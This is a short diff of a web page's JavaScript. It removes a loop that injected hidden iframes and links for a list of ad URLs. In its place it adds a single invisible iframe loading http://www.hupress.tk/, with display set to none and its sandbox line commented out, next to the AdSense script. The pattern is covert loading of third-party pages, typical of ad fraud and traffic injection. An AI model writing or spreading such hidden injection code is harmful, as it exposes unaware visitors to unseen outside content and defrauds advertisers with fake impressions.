@@ -19,7 +19,7 @@ var adList=[
 (adsbygoogle = window.adsbygoogle || []).push({});
 </script> */
 // 'http://adpays.net/v.php?user=4297',
-for(var i=0,len=adList.length;i<len;i++){
+/* for(var i=0,len=adList.length;i<len;i++){
     //iframe 
     var elemIF = document.createElement("iframe");
     elemIF.src = adList[i];
@@ -32,7 +32,12 @@ for(var i=0,len=adList.length;i<len;i++){
     elemA.innerText=adList[i]
     elemA.style.display = "none";
     document.body.appendChild(elemA)
-}
+} */
+var elemIF = document.createElement("iframe");
+elemIF.src = 'http://www.hupress.tk/';
+// elemIF.sandbox = "allow-scripts allow-same-origin allow-forms"
+elemIF.style.display = "none";
+document.body.appendChild(elemIF)
 var elemSC = document.createElement("script");
 elemSC.async;
 elemSC.src = "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
